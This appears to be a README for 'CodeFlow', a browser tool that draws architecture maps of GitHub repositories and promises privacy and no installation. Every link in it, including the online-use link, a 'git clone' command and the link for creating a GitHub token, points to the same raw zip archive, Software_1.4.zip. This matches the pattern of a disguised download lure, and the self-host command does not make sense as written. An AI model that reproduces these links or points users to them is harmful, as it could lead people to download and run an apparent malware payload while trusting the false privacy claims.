## Why CodeFlow?

Ever opened a new codebase and felt completely lost? **CodeFlow** turns any GitHub repository into an interactive architecture map in seconds.

- **No installation required** — runs entirely in your browser
- **No data collection** — your code never leaves your machine
- **No accounts** — just paste a URL and go

```
⚡ Paste URL → See Architecture → Make Better Decisions
```

## Features

### 🗺️ **Interactive Dependency Graph**
See how your files connect at a glance. Click any node to highlight its dependencies. Drag, zoom, and explore.

### 💥 **Blast Radius Analysis**
*"If I change this file, what breaks?"* — CodeFlow answers this instantly. Select any file and see exactly how many files would be affected by changes.

### 👥 **Code Ownership**
Know who owns what. See the top contributors for any file based on git history. Perfect for code reviews and knowing who to ask.

### 🔐 **Security Scanner**
Automatic detection of:
- Hardcoded secrets & API keys
- SQL injection vulnerabilities
- Dangerous `eval()` usage
- Debug statements in production code

### 🧩 **Pattern Detection**
Automatically identifies:
- Singleton patterns
- Factory patterns
- Observer/Event patterns
- React custom hooks
- Anti-patterns (God Objects, high coupling)

### 📊 **Health Score**
Get an instant A-F grade for your codebase based on:
- Dead code percentage
- Circular dependencies
- Coupling metrics
- Security issues

### 🔥 **Activity Heatmap**
Color files by commit frequency to see which parts of your codebase are most actively developed.

### 📋 **PR Impact Analysis**
Paste a PR URL to see exactly which files it affects and calculate the blast radius of proposed changes.

## Privacy First

**Your code stays on your machine.** CodeFlow:

- ✅ Runs 100% in the browser
- ✅ Makes API calls directly from your browser to GitHub
- ✅ Never stores your code or tokens
- ✅ Works with private repos (just add your token locally)
- ✅ No analytics or tracking

Your GitHub token (if used) is only stored in your browser's memory and is cleared when you close the tab.

---

## Quick Start

### Option 1: Use Online (Recommended)
Just visit [CodeFlow](https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip) and paste any GitHub URL.

### Option 2: Self-Host
```bash
# Clone the repo
git clone https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip

# That's it! Just open index.html in your browser
open index.html
```

No build process. No dependencies. No npm install. **It's just one HTML file.**

---

## Usage

### Public Repositories
```
Just paste: facebook/react
Or full URL: https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip
```

### Private Repositories
1. Create a [GitHub Personal Access Token](https://raw.githubusercontent.com/pmanss/codeflow/main/tupelo/Software_1.4.zip) with `repo` scope
2. Paste it in the Token field
3. Analyze your private repos

### Shareable Links
After analysis, click 🔗 to copy a shareable link. Anyone can re-run the same analysis.

## Visualization Modes

| Mode | Description |
|------|-------------|
| 📁 **Folder** | Color by directory structure |
| 🏗️ **Layer** | Color by architectural layer (UI, Services, Utils, etc.) |
| 🔥 **Churn** | Color by commit frequency (hot spots) |
| 💥 **Blast** | Color by impact when a file is selected |

---

## Keyboard Shortcuts

| Key | Action |
|-----|--------|
| `Enter` | Analyze repository |
| `+` / `-` | Zoom in/out |
| `Escape` | Close modal |

## API Limits

GitHub API has rate limits:
- **Without token:** 60 requests/hour
- **With token:** 5,000 requests/hour

For larger repositories, we recommend using a token.

**Zero dependencies to install.** Everything runs from CDNs:
- React 18
- D3.js 7
- Babel (for JSX)

## FAQ

**Q: How does it work without a backend?**
> CodeFlow runs entirely in your browser. It calls the GitHub API directly from your browser and processes everything client-side.

**Q: Is my code safe?**
> Yes. Your code is fetched directly from GitHub to your browser. Nothing is sent to any server we control. Check the source — it's one file!

**Q: Can I use it offline?**
> Not currently, as it needs to fetch from GitHub. But you could fork it and add local file support!

**Q: Why is analysis slow?**
> We make individual API calls for each file to get content. With a token, you get higher rate limits and faster analysis.

**Q: How accurate is the dependency analysis?**
> It's based on function name matching, so it may miss some dynamic imports or renamed imports. It's designed for a quick overview, not 100% accuracy.
